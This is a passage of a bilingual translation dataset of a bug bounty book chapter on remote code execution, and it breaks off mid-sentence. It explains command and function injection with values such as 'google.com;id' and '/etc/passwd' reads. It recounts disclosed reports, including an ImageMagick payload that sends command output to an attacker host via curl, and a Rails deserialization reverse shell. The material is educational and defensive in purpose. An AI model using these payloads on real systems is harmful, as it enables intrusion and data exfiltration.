- en: '**12'
  id: totrans-0
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: '**12'
- en: REMOTE CODE EXECUTION**
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: '**远程代码执行**'
- en: '![Image](../images/common.jpg)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
  zh: '![Image](../images/common.jpg)'
- en: A *remote code execution (RCE)* vulnerability occurs when an application uses
    user-controlled input without sanitizing it. RCE is typically exploited in one
    of two ways. The first is by executing shell commands. The second is by executing
    functions in the programming language that the vulnerable application uses or
    relies on.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: '*远程代码执行（RCE）*漏洞发生在应用程序使用未经清理的用户控制输入时。RCE通常通过两种方式之一被利用。第一种是通过执行shell命令。第二种是通过执行该易受攻击应用程序使用或依赖的编程语言中的函数。'
- en: '**Executing Shell Commands**'
  id: totrans-4
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: '**执行Shell命令**'
- en: 'You can perform RCE by executing shell commands that the application doesn’t
    sanitize. A *shell* gives command line access to an operating system’s services.
    As an example, let’s pretend the site *www.<example>.com* is designed to ping
    a remote server to confirm whether the server is available. Users can trigger
    this by providing a domain name to the `domain` parameter in `www.`example`.com?domain=`,
    which the site’s PHP code processes as follows:'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过执行应用程序没有清理的shell命令来进行RCE。*shell*为操作系统的服务提供了命令行访问权限。例如，假设站点*www.<example>.com*的设计目的是ping一个远程服务器，以确认服务器是否可用。用户可以通过提供一个域名给`domain`参数来触发此操作，URL形式为`www.<example>.com?domain=`，站点的PHP代码按如下方式处理该输入：
- en: '[PRE0]'
  id: totrans-6
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Visiting *www.<example>.com?domain=google.com* assigns the value `google.com`
    to the variable `$domain` at ➊ and then passes that variable directly into the
    `shell_exec` function as an argument for the `ping` command at ➋. The `shell_exec`
    function executes a shell command and returns the complete output as a string.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 访问*www.<example>.com?domain=google.com*会将值`google.com`分配给变量`$domain`，如➊所示，然后将该变量作为`ping`命令的参数直接传递给`shell_exec`函数，如➋所示。`shell_exec`函数执行shell命令并将完整的输出作为字符串返回。
- en: 'The output of this command is something like the following:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令的输出类似于以下内容：
- en: '[PRE1]'
  id: totrans-9
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'The details of the response aren’t important: just know that the `$domain`
    variable is passed directly to the `shell_exec` command without being sanitized.
    In bash, which is a popular shell, you can chain commands together using a semicolon.
    So an attacker could visit the URL *www.<example>.com?domain=google.com;id*, and
    the `shell_exec` function would execute the `ping` and `id` commands. The `id`
    command outputs information about the current user executing the command on the
    server. For example, the output might look like the following:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 响应的详细信息不重要：只需知道`$domain`变量直接传递给`shell_exec`命令，而没有经过清理。在bash中，这是一个常用的shell，你可以使用分号将多个命令串联起来。因此，攻击者可以访问URL
    *www.<example>.com?domain=google.com;id*，`shell_exec`函数将执行`ping`和`id`命令。`id`命令会输出当前在服务器上执行命令的用户信息。例如，输出可能如下所示：
- en: '[PRE2]'
  id: totrans-11
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: The server executes two commands, so the response from the `ping` command displays
    ➊ along with the output from the `id` command. The `id` command’s output ➋ indicates
    the website is running the application on the server as the user named `yaworsk`
    with a `uid` of `1000` that belongs to the `gid` and group `1000` with the same
    name, `yaworsk`.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器执行了两个命令，因此`ping`命令的响应显示了➊以及`id`命令的输出。`id`命令的输出➋表明网站在服务器上以名为`yaworsk`的用户身份运行应用，且该用户的`uid`为`1000`，属于`gid`和组`1000`，组名也是`yaworsk`。
- en: The user permissions of `yaworsk` determine how severe this RCE vulnerability
    is. In this example, an attacker could read the site’s code using the command
    `;cat` FILENAME (where FILENAME is the file to be read) and might write files
    to some directories. If the site uses a database, it’s likely an attacker could
    dump that as well.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: '`yaworsk`用户的权限决定了这个RCE漏洞的严重性。在这个例子中，攻击者可以使用命令`；cat FILENAME`（其中FILENAME是要读取的文件）读取站点的代码，并可能向某些目录写入文件。如果该站点使用数据库，攻击者很可能还可以导出数据库。'
- en: 'This type of RCE occurs if a site trusts user-controlled input without sanitizing
    it. The solution to addressing the vulnerability is simple. In PHP, a website’s
    developer can use the `escapeshellcmd`, which escapes any characters in a string
    that might trick a shell into executing arbitrary commands. As a result, any appended
    commands in the URL parameter would be read as one escaped value. This means that
    `google.com\;id` would have been passed to the `ping` command, resulting in the
    error `ping: google.com;id: Name or service not known`.'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: '如果一个网站在没有清理用户控制的输入的情况下信任它，就会发生这种类型的远程代码执行（RCE）。解决这个漏洞的方法很简单。在 PHP 中，网站开发者可以使用`escapeshellcmd`，它会转义字符串中的任何可能让
    shell 执行任意命令的字符。因此，URL 参数中附加的任何命令都会被视为一个转义值。这意味着`google.com\;id`将被传递给`ping`命令，导致错误`ping:
    google.com;id: Name or service not known`。'
- en: Although the special characters would be escaped to avoid executing additional,
    arbitrary commands, keep in mind that `escapeshellcmd` would not prevent you from
    passing command line flags. A *flag* is an optional argument that changes a command’s
    behavior. For example, `-0` is a common flag used to define a file to write to
    when a command generates output. Passing a flag could change the behavior of the
    command and possibly result in an RCE vulnerability. Preventing RCE vulnerabilities
    can be tricky because of these nuances.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管特殊字符会被转义以避免执行额外的任意命令，但请记住，`escapeshellcmd`并不会阻止你传递命令行标志。*标志*是一个可选参数，用来改变命令的行为。例如，`-0`是一个常用的标志，用于定义一个文件，以便命令生成输出时写入该文件。传递标志可能会改变命令的行为，从而可能导致
    RCE 漏洞。由于这些细微差别，防止 RCE 漏洞可能会很棘手。
- en: '**Executing Functions**'
  id: totrans-16
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: '**执行函数**'
- en: 'You can also perform RCE by executing functions. For example, if *www.<example>.com*
    allowed users to create, view, and edit blog posts via a URL, like *www.<example>.com?id=1&action=view*,
    the code that performed these actions might look like the following:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以通过执行函数来进行远程代码执行。例如，如果*www.<example>.com*允许用户通过 URL 创建、查看和编辑博客文章，例如*www.<example>.com?id=1&action=view*，执行这些操作的代码可能如下所示：
- en: '[PRE3]'
  id: totrans-18
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: Here the website uses the PHP function `call_user_func` ➋, which calls the first
    argument given as a function and passes the remaining parameters as arguments
    to that function. In this case, the application would call the `view` function
    that is assigned to the `action` variable ➊ and pass `1` to the function. This
    command would presumably show the first blog post.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 这里网站使用了 PHP 函数`call_user_func` ➋，该函数将第一个参数作为函数调用，并将剩余的参数作为该函数的参数传递。在这种情况下，应用程序将调用分配给`action`变量的`view`函数
    ➊，并将`1`传递给该函数。这个命令应该显示第一篇博客文章。
- en: 'But if a malicious user visits the URL *www.<example>.com?id=/etc/passwd &action=file_get_contents*,
    this code would evaluate as:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 但是，如果恶意用户访问 URL *www.<example>.com?id=/etc/passwd &action=file_get_contents*，那么这段代码会被解析为：
- en: '[PRE4]'
  id: totrans-21
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Passing `file_get_contents` as the action argument calls that PHP function
    to read the contents of a file into a string. In this case, the file */etc/passwd*
    is passed as the `id` parameter. Then */etc/passwd* is passed as the argument
    to `file_get_contents`, resulting in the file being read. An attacker could use
    this vulnerability to read the source code of the entire application, obtain database
    credentials, write files on the server, and so on. Instead of showing the first
    blog post, the output would look like this:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 传递`file_get_contents`作为操作参数会调用该 PHP 函数，将文件内容读取到一个字符串中。在这种情况下，文件*/etc/passwd*作为`id`参数传递。然后，*/etc/passwd*作为参数传递给`file_get_contents`，导致文件被读取。攻击者可以利用这个漏洞读取整个应用的源代码，获取数据库凭证，在服务器上写文件，等等。这样输出的结果就不再是第一篇博客文章，而是如下所示：
- en: '[PRE5]'
  id: totrans-23
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: If the functions passed to the `action` parameter are not sanitized or filtered,
    it’s also possible for an attacker to invoke shell commands with PHP functions,
    such as `shell_exec`, `exec`, `system`, and so on.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 如果传递给`action`参数的函数没有经过清理或过滤，攻击者还可以通过 PHP 函数调用 shell 命令，例如`shell_exec`、`exec`、`system`等。
- en: '**Strategies for Escalating Remote Code Execution**'
  id: totrans-25
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: '**提升远程代码执行的策略**'
- en: Both types of RCE can cause a variety of effects. When an attacker can execute
    any programming language function, it’s likely they might escalate the vulnerability
    to execute shell commands. Executing shell commands is often more critical because
    an attacker could compromise the entire server rather than just the application.
    The extent of the vulnerability depends on the server user’s permissions or whether
    the attacker can exploit another bug to elevate the user’s privileges, which is
    commonly referred to as *local privilege escalation (LPE)*.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
- en: Although a full explanation of LPEs is beyond the scope of this book, just know
    that an LPE typically occurs by exploiting kernel vulnerabilities, services running
    as root, or *set user ID (SUID)* executables. A *kernel* is the computer’s operating
    system. Exploiting a kernel vulnerability could allow an attacker to elevate their
    permissions to perform actions they otherwise wouldn’t be authorized to do. In
    cases where the attacker can’t exploit the kernel, they could try exploiting services
    running as root. Normally, services shouldn’t run as root; this vulnerability
    often occurs when an administrator ignores security considerations by starting
    a service as the root user. If the administrator is compromised, the attacker
    could access the service running as root, and any commands the service runs would
    have elevated root permissions. Lastly, the attacker could exploit SUID, which
    allows users to execute a file with the permissions of a specified user. Although
    this is meant to enhance security, when misconfigured, it could allow attackers
    to execute commands with elevated privileges, similar to services running as root.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
- en: Given the variety of operating systems, server software, programming languages,
    frameworks, and so on used to host websites, it’s impossible to detail every way
    you could inject functions or shell commands. But there are patterns to finding
    clues to where potential RCEs might exist without seeing the application code.
    In the first example, one red flag was that the site executed the `ping` command,
    which is a system-level command.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
- en: In the second example, the `action` parameter is a red flag because it allowed
    you to control what function is run on the server. When you’re looking for these
    types of clues, look at the parameters and values passed to the site. You can
    easily test this type of behavior by passing system actions or special command
    line characters, like semicolons or backticks, to the parameters in place of expected
    values.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
- en: 'Another common cause of an application-level RCE is unrestricted file uploads
    that the server executes when visited. For example, if a PHP website allows you
    to upload files to a workspace but doesn’t restrict the file type, you could upload
    a PHP file and visit it. Because a vulnerable server can’t differentiate between
    legitimate PHP files for the application and your malicious upload, the file will
    be interpreted as PHP and its contents will be executed. Here’s an example of
    a file that allows you to execute PHP functions defined by the URL parameter `super_secret_web_param`:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  id: totrans-31
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: If you uploaded this file to *www.<example>.com* and accessed it at *www.<example>.com/files/shell.php*,
    you could execute system commands by adding the parameter with a function, such
    as `?super_secret_web_param='ls'`. Doing so would output the contents of the *files*
    directory. Be extremely careful when you’re testing this type of vulnerability.
    Not all bounty programs want you to execute your own code on their server. If
    you do upload a shell like this, be sure to delete it so no one else finds it
    or exploits it maliciously.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
- en: More complex RCE examples are often the result of nuanced application behavior
    or programming mistakes. In fact, such examples were discussed in [Chapter 8](ch08.xhtml#ch08).
    Orange Tsai’s Uber Flask Jinja2 template injection ([page 74](ch08.xhtml#page_74))
    was an RCE that permitted him to execute his own Python functions using the Flask
    templating language. My Unikrn Smarty template injection ([page 78](ch08.xhtml#page_78))
    allowed me to exploit the Smarty framework to execute PHP functions, including
    `file_get_contents`. Given the variety of RCEs, here we’ll focus on more traditional
    examples than those you’ve seen in previous chapters.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
- en: '**Polyvore ImageMagick**'
  id: totrans-34
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** Medium'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *[Polyvore.com](http://Polyvore.com)* (Yahoo! acquisition)'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[http://nahamsec.com/exploiting-imagemagick-on-yahoo/](http://nahamsec.com/exploiting-imagemagick-on-yahoo/)*'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** May 5, 2016'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** $2,000'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
- en: Looking at vulnerabilities that have been disclosed in widely used software
    libraries can be an effective way to discover bugs in sites using that software.
    ImageMagick is a common graphics library that processes images and has an implementation
    in most, if not all, major programming languages. This means that an RCE in the
    ImageMagick library can have devastating effects on websites that rely on it.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
- en: 'In April 2016, the maintainers of ImageMagick publicly disclosed library updates
    to fix critical vulnerabilities. The updates revealed that ImageMagick wasn’t
    properly sanitizing input in a variety of ways. The most dangerous of these led
    to an RCE via ImageMagick’s `delegate` functionality, which processes files using
    external libraries. The following code does this by passing a user-controlled
    domain to the `system()` command as the placeholder %M:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  id: totrans-42
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'This value was not sanitized before it was used, so submitting `https://`example`.com";|ls
    "-la` would translate to this:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  id: totrans-44
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: As in the earlier RCE example, which involved chaining extra commands to `ping`,
    this code chains an extra command line function to the intended functionality
    using a semicolon.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
- en: The `delegate` functionality can be abused by image file types that allow external
    file referencing. Examples include SVGs and the ImageMagick-defined file type,
    MVG. When ImageMagick processes an image, it tries to guess a file’s type based
    on its file contents rather than its extension. For example, if a developer tried
    to sanitize user-submitted images by allowing their application to accept only
    user files ending in *.jpg*, an attacker could bypass the sanitization by renaming
    a *.mvg* file as a *.jpg*. The application would believe the file is a safe *.jpg*,
    but ImageMagick would properly recognize the file type was an MVG based on the
    file content. This would allow the attacker to abuse the ImageMagick RCE vulnerability.
    Examples of malicious files used to abuse this ImageMagick vulnerability are available
    at *[https://imagetragick.com/](https://imagetragick.com/)*.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
- en: 'After this vulnerability was publicly disclosed and websites had an opportunity
    to update their code, Ben Sadeghipour went hunting for sites using unpatched versions
    of ImageMagick. As his first step, Sadeghipour re-created the vulnerability on
    his own server to confirm he had a working malicious file. He chose to use the
    example MVG file from *[https://imagetragick.com/](https://imagetragick.com/)*,
    but could have easily used the SVG file as well, since both reference external
    files which will trigger the vulnerable ImageMagick `delegate` functionality.
    Here’s his code:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  id: totrans-48
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: The important part of this file is the line at ➊, which includes the malicious
    input. Let’s break it down. The first part of the exploit is *https://127.0.0.1/x.php?x=*.
    This is the remote URL ImageMagick is expecting as part of its delegator behavior.
    Sadeghipour follows this with `` `id ``. On the command line, backticks (`` `
    ``) denote input that the shell should process before the main command. This ensures
    that Sadeghipour’s payload (described next) is processed immediately.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
- en: The pipe (`|`) passes output from one command to the next. In this case, the
    output of `id` is passed to `curl http://`SOMEIPADDRESS`:8080/ -d @-`. The cURL
    library makes remote HTTP requests and, in this case, makes a request to Sadeghipour’s
    IP address, which is listening on port 8080\. The `-d` flag is a cURL option to
    send data as a `POST` request. The `@` instructs cURL to use the input exactly
    as it receives it with no other processing. The hyphen (`–`) denotes that standard
    input will be used. When all of this syntax is combined with the pipe (`|`), the
    output of the `id` command will be passed to cURL as the `POST` body without any
    processing. Finally, the `> /dev/null` code drops any output from the command
    so that nothing is printed to the vulnerable server terminal. This helps keep
    the target from realizing that their security has been compromised.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
- en: Before uploading the file, Sadeghipour started a server to listen for HTTP requests
    using Netcat, a common networking utility for reading and writing to connections.
    He ran the command `nc -l -n -vv -p 8080`, which allowed Sadeghipour to log `POST`
    requests to his server. The `-l` flag enables listen mode (to receive requests),
    `-n` prevents DNS lookups, `-vv` enables verbose logging, and `-p 8080` defines
    the port used.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
- en: Sadeghipour tested his payload on the Yahoo! site Polyvore. After uploading
    his file on the site as an image, Sadeghipour received the following `POST` request,
    which included the result of the `id` command executed on Polyvore servers in
    the body.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  id: totrans-53
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: This request meant that Sadeghipour’s MVG file was successfully executed, causing
    the vulnerable website to execute the `id` command.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
- en: '***Takeaways***'
  id: totrans-55
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: There are two significant takeaways from Sadeghipour’s bug. First, being aware
    of disclosed vulnerabilities provides you with the opportunity to test new code,
    as mentioned in previous chapters. If you’re testing large libraries, also ensure
    that the companies of the websites you’re testing are properly managing their
    security updates. Some programs will ask you not to report unpatched updates within
    a given time frame of the disclosure, but after that you’re free to report the
    vulnerability. Second, reproducing vulnerabilities on your own servers is a great
    learning opportunity. It ensures that your payloads are functional when you attempt
    to implement them for a bug bounty.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
- en: '**Algolia RCE on [facebooksearch.algolia.com](http://facebooksearch.algolia.com)**'
  id: totrans-57
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '**Difficulty:** High'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
- en: '**URL:** *[facebooksearch.algolia.com](http://facebooksearch.algolia.com)*'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
- en: '**Source:** *[https://hackerone.com/reports/134321/](https://hackerone.com/reports/134321/)*'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
- en: '**Date reported:** April 25, 2016'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
- en: '**Bounty paid:** $500'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
- en: Proper reconnaissance is an important part of hacking. On April 25, 2016, Michiel
    Prins (a HackerOne co-founder) was doing recon on *[algolia.com](http://algolia.com)*
    using the tool Gitrob. This tool takes an initial GitHub repository, person, or
    organization as a seed and spiders all repositories it can find from people connected
    to it. Within all the repositories it finds, it will look for sensitive files
    based on keywords, such as *password, secret, database,* and so on.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 正确的侦查是黑客攻击的重要部分。2016年4月25日，Michiel Prins（HackerOne 联合创始人）正在使用工具 Gitrob 对 *[algolia.com](http://algolia.com)*
    进行侦查。该工具以一个 GitHub 仓库、个人或组织为种子，爬取与之相关的所有仓库。在所有找到的仓库中，它将根据关键词（如 *password, secret,
    database* 等）查找敏感文件。
- en: Using Gitrob, Prins noticed that Algolia had publicly committed a Ruby on Rails
    `secret_key_base` value to a public repository. The `secret_key_base` helps Rails
    prevent attackers from manipulating signed cookies, and it’s meant to be concealed
    and never shared. Typically, this value is replaced by the environment variable
    `ENV['SECRET_KEY_BASE']`, which only the server can read. Using the `secret_key_base`
    is especially important when a Rails site uses a cookiestore to store session
    information in the cookies (we’ll come back to this). Because Algolia committed
    the value to a public repository, the `secret_key_base` value is still visible
    at *[https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/](https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/)*
    but is no longer valid.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Gitrob，Prins 发现 Algolia 在公共代码库中公开提交了 Ruby on Rails 的 `secret_key_base` 值。`secret_key_base`
    帮助 Rails 防止攻击者篡改签名的 cookie，而它应该被隐藏并且永远不应公开分享。通常，这个值会被替换为环境变量 `ENV['SECRET_KEY_BASE']`，只有服务器可以读取。当
    Rails 网站使用 cookiestore 来存储会话信息时（我们稍后会讲到），使用 `secret_key_base` 特别重要。因为 Algolia
    将该值提交到了公共代码库中，所以 `secret_key_base` 的值仍然可以在 *[https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/](https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12/)*
    上查看，但它已不再有效。
- en: 'When Rails signs a cookie, it appends a signature to the cookie’s base64-encoded
    value. For example, a cookie and its signature might look like this: `BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b8`.
    Rails checks the signature after the double dashes to ensure the beginning of
    the cookie hasn’t been altered. This is significant when Rails is using the cookiestore,
    because Rails manages website sessions using cookies and their signatures by default.
    Information about a user can be added to the cookie and read by the server when
    the cookie is submitted via an HTTP request. Because the cookie is saved on a
    person’s computer, Rails signs the cookie with the secret to ensure it hasn’t
    been tampered with. How the cookie is read is also important; the Rails cookiestore
    serializes and deserializes the information stored in the cookie.'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 当 Rails 对一个 cookie 进行签名时，它会将签名附加到 cookie 的 base64 编码值后面。例如，cookie 和其签名可能看起来像这样：`BAh7B0kiD3Nlc3Npb25faWQGOdxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b8`。Rails
    会检查双破折号后的签名，以确保 cookie 的开头没有被篡改。当 Rails 使用 cookiestore 时，这一点尤为重要，因为 Rails 默认使用
    cookies 及其签名来管理网站会话。用户的信息可以被添加到 cookie 中，并在通过 HTTP 请求提交 cookie 时被服务器读取。由于 cookie
    被保存在用户的计算机上，Rails 使用 secret 对其进行签名，以确保其未被篡改。如何读取 cookie 也很重要；Rails 的 cookiestore
    会对存储在 cookie 中的信息进行序列化和反序列化。
- en: In computer science, *serialization* is the process of converting an object
    or data into a state that allows it to be transferred and reconstructed. In this
    case, Rails converts the session information into a format that can be stored
    in a cookie and reread when a user submits the cookie during their next HTTP request.
    After serialization, the cookie is read through deserialization. The deserialization
    process is complex and beyond the scope of this book. But it can often lead to
    RCEs it is passed untrusted data.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 在计算机科学中，*序列化* 是将对象或数据转换为可以传输和重建的状态的过程。在此情况下，Rails 将会话信息转换为一种格式，以便存储在 cookie
    中，并在用户提交 cookie 进行下一次 HTTP 请求时重新读取。序列化之后，cookie 会通过反序列化读取。反序列化过程比较复杂，超出了本书的范围。但如果传递了不可信的数据，它常常会导致
    RCE（远程代码执行）。
- en: '**NOTE**'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*To learn more about deserialization, see these two great resources: Matthias
    Kaiser’s “Exploiting Deserialization Vulnerabilities in Java” talk at* [https://www.youtube.com/watch?v=VviY3O-euVQ/](https://www.youtube.com/watch?v=VviY3O-euVQ/)
    *and Alvaro Muñoz and Alexandr Mirosh’s “Friday the 13th JSON attacks” talk at*
    [https://www.youtube.com/watch?v=ZBfBYoK_Wr0/](https://www.youtube.com/watch?v=ZBfBYoK_Wr0/)).'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: '*要了解更多关于反序列化的信息，请参考以下两个非常好的资源：Matthias Kaiser在* [https://www.youtube.com/watch?v=VviY3O-euVQ/](https://www.youtube.com/watch?v=VviY3O-euVQ/)
    *上讲的“在Java中利用反序列化漏洞”的演讲，以及Alvaro Muñoz和Alexandr Mirosh在* [https://www.youtube.com/watch?v=ZBfBYoK_Wr0/](https://www.youtube.com/watch?v=ZBfBYoK_Wr0/)
    *上讲的“13号星期五JSON攻击”的演讲。*'
- en: Knowing the Rails secret meant Prins could create his own valid serialized objects
    and send them to the site to be deserialized via a cookie. If vulnerable, deserialization
    would lead to an RCE.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 了解Rails秘钥后，Prins能够创建自己有效的序列化对象，并通过cookie将其发送到网站进行反序列化。如果存在漏洞，反序列化将导致RCE。
- en: Prins used a Metasploit Framework exploit called Rails Secret Deserialization
    to escalate this vulnerability into an RCE. The Metasploit exploit creates a cookie
    that invokes a reverse shell if it’s successfully deserialized. Prins sent the
    malicious cookie to Algolia, which enabled a shell on the vulnerable server. As
    a proof of concept, he ran the command `id`, which returned `uid=1000(prod) gid=1000(prod)
    groups=1000(prod)`. He also created the file *hackerone.txt* on the server to
    demonstrate the vulnerability.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: Prins使用了一种名为Rails Secret Deserialization的Metasploit框架漏洞，将此漏洞升级为RCE。该Metasploit漏洞创建了一个cookie，如果成功反序列化，它将调用反向shell。Prins将恶意cookie发送给Algolia，这使得在易受攻击的服务器上启用了shell。作为概念验证，他运行了`id`命令，返回了`uid=1000(prod)
    gid=1000(prod) groups=1000(prod)`。他还在服务器上创建了文件*hackerone.txt*来演示这个漏洞。
- en: '***Takeaways***'
  id: totrans-71
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: '***要点***'
- en: In this case, Prins used an automated tool to scrape public repositories for
    sensitive values. By doing the same, you can also discover any repositories using
    suspicious keywords that might clue you in to vulnerabilities. Exploiting deserialization
    vulnerabilities can be very complex, but some automated tools exist to make this
    easier. For example, you can use Rapid7’s Rails Secret Deserialization for earlier
    versions of Rails and ysoserial, which is maintained by Chris Frohoff, for Java
    deserialization vulnerabilities.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，Prins使用了一个自动化工具来抓取公共仓库中的敏感值。通过执行相同的操作，你也可以发现任何使用可疑关键词的仓库，这些仓库可能会透露出漏洞的线索。利用反序列化漏洞可能非常复杂，但也有一些自动化工具可以简化这一过程。例如，你可以使用Rapid7的Rails
    Secret Deserialization来处理较早版本的Rails，或者使用由Chris Frohoff维护的ysoserial来处理Java的反序列化漏洞。
- en: '**RCE Through SSH**'
  id: totrans-73
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: '**通过SSH获取RCE**'
- en: '**Difficulty:** High'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: '**难度：** 高'
- en: '**URL:** N/A'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: '**URL:** 无'
- en: '**Source:** *[blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/](http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/)*'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '**来源：** *[blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/](http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/)*'
- en: '**Date reported:** Fall 2017'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: '**报告日期：** 2017年秋季'
- en: '**Bounty paid:** Undisclosed'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '**悬赏支付：** 未公开'
- en: When a target program gives you a large scope to test, it’s best to automate
    the discovery of assets, then look for subtle indicators that a site might contain
    vulnerabilities. This is exactly what Jasmin Landry did in the fall of 2017\.
    He began enumerating subdomains and open ports on a website by using the tools
    Sublist3r, Aquatone, and Nmap. Because he had discovered hundreds of possible
    domains and it was impossible to visit them all, he used the automated tool EyeWitness
    to take screenshots of each one. This helped him visually identify interesting
    websites.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 当目标程序给你提供了一个大范围的测试时，最好自动化资产的发现，然后寻找一些微妙的迹象，判断一个网站是否可能存在漏洞。这正是Jasmin Landry在2017年秋天所做的。他开始使用工具Sublist3r、Aquatone和Nmap枚举一个网站的子域名和开放端口。由于他发现了数百个可能的域名，而不可能访问所有域名，他使用了自动化工具EyeWitness来对每个域名进行截图。这帮助他在视觉上识别出有趣的网站。
- en: 'EyeWitness disclosed a content management system that Landry found unfamiliar,
    looked old, and was open source. Landry guessed the default credentials for the
    software would be `admin:admin`. Testing them worked, so he kept digging. The
    site didn’t have any content, but auditing the open source code revealed the application
    ran as the root user on a server. This is bad practice: the root user can perform
    any action on a site, and if the application is compromised, an attacker would
    have full permissions on the server. This was another reason for Landry to keep
    digging.'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: EyeWitness 透露了一个内容管理系统，Landry 觉得它不熟悉，看起来很旧，而且是开源的。Landry 猜测软件的默认凭据可能是 `admin:admin`。测试后成功登录，因此他继续深入研究。这个网站没有任何内容，但审计开源代码时发现该应用以
